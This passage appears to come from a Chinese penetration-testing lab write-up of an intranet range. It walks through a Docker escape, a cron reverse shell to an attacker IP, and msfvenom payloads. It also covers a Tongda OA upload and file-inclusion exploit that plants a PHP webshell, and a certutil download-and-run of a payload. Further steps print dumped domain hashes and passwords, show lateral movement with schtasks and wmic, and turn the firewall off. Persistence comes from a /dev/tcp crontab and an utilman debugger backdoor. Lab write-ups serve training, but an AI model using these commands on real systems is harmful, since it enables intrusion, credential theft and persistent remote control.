+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095951355.png" srcset="/img/loading.gif" lazyload alt="image-20240302095951355"></p>
+<p>添加成功</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302100113137.png" srcset="/img/loading.gif" lazyload alt="image-20240302100113137"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302100139487.png" srcset="/img/loading.gif" lazyload alt="image-20240302100139487"></p>
+<p>进行docker 逃逸</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302100324069.png" srcset="/img/loading.gif" lazyload alt="image-20240302100324069"></p>
+<p>尝试写定时任务 反弹shell</p>
+<p>记得前面有一个hacker </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302100958902.png" srcset="/img/loading.gif" lazyload alt="image-20240302100958902"></p>
+<p>发现里面有东西</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">touch <span class="hljs-regexp">/hacker/</span>hacker.sh<br>echo <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.52.10/11234 0&gt;&amp;1&quot;</span> &gt;<span class="hljs-regexp">/hacker/</span>hacker.sh<br>echo <span class="hljs-string">&quot;* * * * * root bash /hacker.sh&quot;</span> &gt;&gt; <span class="hljs-regexp">/hacker/</span>etc/crontab<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302111754917.png" srcset="/img/loading.gif" lazyload alt="image-20240302111754917"></p>
+<p>反弹成功</p>
+<p>为了区分，这个主机位ubuntu2</p>
+<p>查看ubuntu1</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302111822093.png" srcset="/img/loading.gif" lazyload alt="image-20240302111822093"></p>
+<p>确定是两个用户</p>
+</li>
+<li><p>ubuntu 1上线msf </p>
+<p>通过wget 下载</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301211336385.png" srcset="/img/loading.gif" lazyload alt="image-20240301211336385"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301211327195.png" srcset="/img/loading.gif" lazyload alt="image-20240301211327195"></p>
+</li>
+<li><p>开启代理</p>
+<p>上传agent</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">upload <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/penetration/</span>proxy<span class="hljs-regexp">/stowaway/</span>agent<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301211732510.png" srcset="/img/loading.gif" lazyload alt="image-20240301211732510"></p>
+<p>kali 使用admin</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301211947973.png" srcset="/img/loading.gif" lazyload alt="image-20240301211947973"></p>
+<p>ubuntu 连接</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301211940831.png" srcset="/img/loading.gif" lazyload alt="image-20240301211940831"></p>
+<p>开启代理</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301212031361.png" srcset="/img/loading.gif" lazyload alt="image-20240301212031361"></p>
+</li>
+<li><p>ubuntu2 上线msf </p>
+<p>生成bind 的payload </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p linux<span class="hljs-regexp">/x64/m</span>eterpreter/bind_tcp -f elf &gt; l_x64_bind.elf<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302135857740.png" srcset="/img/loading.gif" lazyload alt="image-20240302135857740"></p>
+<p>上传到ubuntu1 通过python 开启http服务<img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302135710164.png" srcset="/img/loading.gif" lazyload alt="image-20240302135710164"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302140208829.png" srcset="/img/loading.gif" lazyload alt="image-20240302140208829"></p>
+<p>上线成功</p>
+</li>
+</ol>
+<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>基于通过redis 获取的ubuntu</p>
+<ol>
+<li><p>网段</p>
+<p>ubuntu1</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301212214858.png" srcset="/img/loading.gif" lazyload alt="image-20240301212214858"></p>
+<p>ubuntu2</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302143030971.png" srcset="/img/loading.gif" lazyload alt="image-20240302143030971"></p>
+<p>发现新的网段</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302143439346.png" srcset="/img/loading.gif" lazyload alt="image-20240302143439346"></p>
+</li>
+<li><p>fscan</p>
+<p>192.168.52.1&#x2F;24</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302143207070.png" srcset="/img/loading.gif" lazyload alt="image-20240302143207070"></p>
+<p>发现还有30主机</p>
+<p>192.168.93.1&#x2F;24</p>
+</li>
+<li><p>设置服务器代理</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301213015977.png" srcset="/img/loading.gif" lazyload alt="image-20240301213015977"></p>
+</li>
+</ol>
+<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="192-168-53-30"><a href="#192-168-53-30" class="headerlink" title="192.168.53.30"></a>192.168.53.30</h2><ol>
+<li><p>端口信息收集</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302143714207.png" srcset="/img/loading.gif" lazyload alt="image-20240302143714207"></p>
+<p>发现了通达oa</p>
+</li>
+<li><p>通达oa</p>
+<p>利用网站开启代理进行访问<img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302143900346.png" srcset="/img/loading.gif" lazyload alt="image-20240302143900346"></p>
+<p>通过网络搜索相关漏洞</p>
+<p>或者使用利群</p>
+<p>先开启代理</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302160028355.png" srcset="/img/loading.gif" lazyload alt="image-20240302160028355"></p>
+<p>发现没有用</p>
+<p>还是手动利用吧</p>
+<p>给bp设置代理</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302165309497.png" srcset="/img/loading.gif" lazyload alt="image-20240302165309497"></p>
+<p>使用bp自带的浏览器开启</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302165333235.png" srcset="/img/loading.gif" lazyload alt="image-20240302165333235"></p>
+<p>上产图片🐎</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/im/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.52.30:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>658<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=123<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;UPLOAD_MODE&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">2</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;P&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">123</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;DEST_UID&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">1</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;ATTACHMENT&quot;</span>; filename=<span class="hljs-string">&quot;jpg&quot;</span></span><br><span class="language-php">Content-Type: image/jpeg</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="language-php"><span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c &quot;</span>.<span class="hljs-variable">$command</span>);</span><br><span class="language-php"><span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();</span><br><span class="language-php"><span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302165647971.png" srcset="/img/loading.gif" lazyload alt="image-20240302165647971"></p>
+<p>记住路径</p>
+<p>使用文件包含访问</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/interface/gateway.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.52.30:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>python-requests/2.21.0<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>87<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-dockerfile">json=&#123;<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;/general/../../attach/im/2403/1795188965.jpg&quot;</span>&#125;&amp;<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">whoami</span></span></span><br><span class="language-dockerfile"></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302165728205.png" srcset="/img/loading.gif" lazyload alt="image-20240302165728205"></p>
+<p>成功</p>
+<p>上传payload 到ubuntu1 开启http让192.168.53.30 下载</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302172748829.png" srcset="/img/loading.gif" lazyload alt="image-20240302172748829"></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">52.10</span>:<span class="hljs-number">8000</span>/w_x64_bind_26767.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\win.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-keyword">c</span>:\win.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302173113946.png" srcset="/img/loading.gif" lazyload alt="image-20240302173113946"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302173119915.png" srcset="/img/loading.gif" lazyload alt="image-20240302173119915"></p>
+<p>msf 连接</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302173553383.png" srcset="/img/loading.gif" lazyload alt="image-20240302173553383"></p>
+</li>
+<li><p>上线cs</p>
+<p>传递不了，忘记了这个是内网</p>
+</li>
+<li><p>查看一下网段</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302174615182.png" srcset="/img/loading.gif" lazyload alt="image-20240302174615182"></p>
+</li>
+<li><p>开启双层代理</p>
+<p>上传工具</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175338426.png" srcset="/img/loading.gif" lazyload alt="image-20240302175338426"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175450631.png" srcset="/img/loading.gif" lazyload alt="image-20240302175450631"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175623173.png" srcset="/img/loading.gif" lazyload alt="image-20240302175623173"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175616092.png" srcset="/img/loading.gif" lazyload alt="image-20240302175616092"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175712234.png" srcset="/img/loading.gif" lazyload alt="image-20240302175712234"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175805899.png" srcset="/img/loading.gif" lazyload alt="image-20240302175805899"></p>
+<p>成功（为什么不用ubuntu 作为第二层的代理，因为ubuntu2不稳定，极其不稳定）</p>
+</li>
+<li><p>进行信息收集一下</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302183032033.png" srcset="/img/loading.gif" lazyload alt="image-20240302183032033"></p>
+<p>可以断定处于域环境</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302183114085.png" srcset="/img/loading.gif" lazyload alt="image-20240302183114085"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302183221747.png" srcset="/img/loading.gif" lazyload alt="image-20240302183221747"></p>
+<p>那么40 就是pc2，30为dc</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302183557786.png" srcset="/img/loading.gif" lazyload alt="image-20240302183557786"></p>
+<p>获取域用户的hash 和密码</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Administrator  WHOAMIANONY  <span class="hljs-number">56</span>b<span class="hljs-number">0</span>cd<span class="hljs-number">8</span>b<span class="hljs-number">125</span><span class="hljs-keyword">c</span><span class="hljs-number">05055e2</span>dd<span class="hljs-number">9e955</span>f<span class="hljs-number">18034</span>  ab<span class="hljs-number">89</span>b<span class="hljs-number">1295e69</span>d<span class="hljs-number">353</span>dd<span class="hljs-number">7614</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>a<span class="hljs-number">3</span>a<span class="hljs-number">80</span>cec  <span class="hljs-number">2</span>bc<span class="hljs-number">4124300</span>a<span class="hljs-number">6</span>a<span class="hljs-number">8</span>fc<span class="hljs-number">0</span>ca<span class="hljs-number">10891823</span>d<span class="hljs-number">36</span><span class="hljs-keyword">c</span><span class="hljs-number">64e4</span>b<span class="hljs-number">3</span>a<span class="hljs-number">40</span><br>PC<span class="hljs-number">1</span>$           WHOAMIANONY                                    <span class="hljs-number">3e6</span>a<span class="hljs-number">3</span>d<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">713</span>b<span class="hljs-number">4821</span>eaa<span class="hljs-number">51</span>aab<span class="hljs-number">25</span>f<span class="hljs-number">52074</span>  d<span class="hljs-number">8e1318</span>a<span class="hljs-number">24</span><span class="hljs-keyword">c</span><span class="hljs-number">64</span>b<span class="hljs-number">8</span>fcc<span class="hljs-number">89</span>dc<span class="hljs-number">8609</span>b<span class="hljs-number">09</span>af<span class="hljs-number">50342</span>bacf<br>bunny          WHOAMIANONY  <span class="hljs-number">7</span>de<span class="hljs-number">10</span>bf<span class="hljs-number">327</span>ef<span class="hljs-number">7</span>f<span class="hljs-number">2</span>ac<span class="hljs-number">6</span>ebe<span class="hljs-number">8776</span>a<span class="hljs-number">153</span>feb  <span class="hljs-keyword">cc</span><span class="hljs-number">567</span>d<span class="hljs-number">5556030</span>b<span class="hljs-number">7356</span>ee<span class="hljs-number">4915</span>ff<span class="hljs-number">098</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>f  <span class="hljs-number">3747632756191e3350</span>e<span class="hljs-number">53211</span><span class="hljs-keyword">c</span><span class="hljs-number">63</span>f<span class="hljs-number">804</span>eb<span class="hljs-number">163638</span>f<br><br><br>Administrator  WHOAMIANONY  Whoami<span class="hljs-number">2021</span><br>bunny          WHOAMIANONY  Bunny<span class="hljs-number">2021</span><br><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>开启远程桌面</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic RDTOGGLE <span class="hljs-keyword">WHERE</span> ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="192-168-93-40"><a href="#192-168-93-40" class="headerlink" title="192.168.93.40"></a>192.168.93.40</h2><ol>
+<li><p>hash传递</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302184657352.png" srcset="/img/loading.gif" lazyload alt="image-20240302184657352"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302184709658.png" srcset="/img/loading.gif" lazyload alt="image-20240302184709658"></p>
+</li>
+</ol>
+<h2 id="192-168-93-30"><a href="#192-168-93-30" class="headerlink" title="192.168.93.30"></a>192.168.93.30</h2><ol>
+<li><p>hash 传递</p>
+<p>失败</p>
+</li>
+<li><p>IPC 横向移动</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302214107064.png" srcset="/img/loading.gif" lazyload alt="image-20240302214107064"></p>
+<p>拿着域控，走遍域控</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302214213288.png" srcset="/img/loading.gif" lazyload alt="image-20240302214213288"></p>
+<p>上传payload </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302214413150.png" srcset="/img/loading.gif" lazyload alt="image-20240302214413150"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /s 192.168.93.30 /u WHOAMIANONY\Administrator /p <span class="hljs-string">&quot;Whoami2021&quot;</span> /sc MINUTE /mo 1 /tn test2 /tr <span class="hljs-string">&quot;c:\w_x64_bind_26767.exe&quot;</span><br>schtasks /run /s 192.168.93.30 /u WHOAMIANONY\Administrator /p <span class="hljs-string">&quot;Whoami2021&quot;</span> /tn test2<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>wmic</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.93</span><span class="hljs-number">.30</span> /<span class="hljs-keyword">user</span>:Administrator /<span class="hljs-keyword">password</span>:Whoami2021 process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c c:\test.exe&quot;<br></code></pre></td></tr></table></figure>
+
+<p>利用失败</p>
+</li>
+<li><p>关闭防火墙</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">93</span>.<span class="hljs-number">30</span> create uf <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">93</span>.<span class="hljs-number">30</span> start uf<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>在尝试pth</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302225423088.png" srcset="/img/loading.gif" lazyload alt="image-20240302225423088"></p>
+</li>
+</ol>
+<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><ol>
+<li><p>ubuntu1</p>
+<ul>
+<li><p>已经写了公钥</p>
+</li>
+<li><p>还可以写定时任务</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">(crontab -l;echo &#x27;* */1 * * * exec 9&lt;&gt; /dev/tcp/192.168.79.137/<span class="hljs-number">1999</span>9;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#x27;)<span class="hljs-string">|crontab -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302230233044.png" srcset="/img/loading.gif" lazyload alt="image-20240302230233044"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302230315423.png" srcset="/img/loading.gif" lazyload alt="image-20240302230315423"></p>
+</li>
+<li><p>通过ssh 软连接后门</p>
+</li>
+<li><p>起别名后门</p>
+</li>
+</ul>
+</li>
+<li><p>ubuntu2 </p>
+<p>和ubuntu1同理</p>
+<ul>
+<li><p>尝试写公钥</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302230918187.png" srcset="/img/loading.gif" lazyload alt="image-20240302230918187"></p>
+<p>没办法</p>
+</li>
+</ul>
+</li>
+<li><p>pc1</p>
+<ul>
+<li><p>劫持</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>开启远程桌面</p>
